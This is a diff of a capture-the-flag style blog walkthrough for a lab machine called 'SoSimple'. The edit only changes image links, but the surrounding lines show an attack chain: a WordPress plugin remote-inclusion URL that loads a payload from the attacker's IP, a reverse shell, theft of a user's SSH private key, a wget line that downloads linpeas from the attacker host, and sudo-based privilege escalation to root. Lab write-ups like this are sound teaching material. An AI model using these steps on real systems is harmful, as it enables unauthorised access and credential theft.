@@ -29,7 +29,7 @@ As the result, Nmap have found two ports on, which is http and ssh. That indicat
 ```
 
 After knowing the result, we can start to find the way to enter the server, at first we will be head into a main page with only a simple picture on it. And there's no useful information inside the terminal. 
-![[/img/in-post/sosimple/Pasted image 20230207195730.png]]
+![](/img/in-post/sosimple/Pasted image 20230207195730.png)
 
 From wappalyzer and nmap that we could know it's a  2.4.41 apache server, so here comes two attempts:
 1. Find if there's Apache 2.4.41 exploit
@@ -59,7 +59,7 @@ First, we could test if the payload is useful or not by the step as follow:
 3. Type the payload url `http://192.168.76.78/wordpress/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://192.168.49.76/swpayload.txt`
 
 It works like a charm, but it's inconvenient to use the web interface like that, it'd be better to use a reverse shell instead. So we need to generate a payload and activate the reverse shell.
-![[/img/in-post/sosimple/Pasted image 20230206225851.png]]
+![](/img/in-post/sosimple/Pasted image 20230206225851.png)
 
 So we need to:
 1. Generate a payload
@@ -81,7 +81,7 @@ Then we could modify the command to download and execute the payload
 ```
 
 After execute the url again, we successfully accessed the reverse shell. *The ip is used for renewing the pictures, please don't bother with it*
-![[/img/in-post/sosimple/Pasted image 20230207205407.png]]
+![](/img/in-post/sosimple/Pasted image 20230207205407.png)
 
 So after we accessed the server, it's time for us to look for some credentials. There usually are some information that will be inside of:
 ```
@@ -94,7 +94,7 @@ We found we could access `/home/max` and the file inside it by using
 ```bash
 ls -lah /home/max/
 ```
-![[/img/in-post/sosimple/Pasted image 20230207205915.png]]
+![](/img/in-post/sosimple/Pasted image 20230207205915.png)
 
 To simplify the explanation, the first flag is at `local.txt`. And we found `.ssh` might include the information that could be very helpful. And boom! `id_rsa` is inside the `.ssh` folder, so we could use it to ssh as the identity of max.
 
@@ -118,7 +118,7 @@ mkdir /tmp/hi && cd /tmp/hi && wget 192.168.49.76/linpeas.sh && chmod +x linpeas
 ```
 
 We found the useful information as below with the yellow highlighted. Which is checked by `sudo -l`
-![[/img/in-post/sosimple/Pasted image 20230207023908.png]]
+![](/img/in-post/sosimple/Pasted image 20230207023908.png)
 
 It means we can run the `/usr/sbin/service` with user `steven`, and we know from [gtfobins](https://gtfobins.github.io/gtfobins/service/) that we can use the service to access a bash with follow command.
 ``` bash
@@ -126,7 +126,7 @@ sudo -u steven /usr/sbin ../../bin/sh
 ```
 
 After enter the bash with `steven`, run `sudo -l` again, we'll found out that we can run `/opt/tools/server-health.sh` with root permission with no password needed.
-![[/img/in-post/sosimple/Pasted image 20230207033041.png]]
+![](/img/in-post/sosimple/Pasted image 20230207033041.png)
 
 However, there's no file found as `/opt/tools/server-health.sh`, so we make one by our self then execute it.
 ``` bash
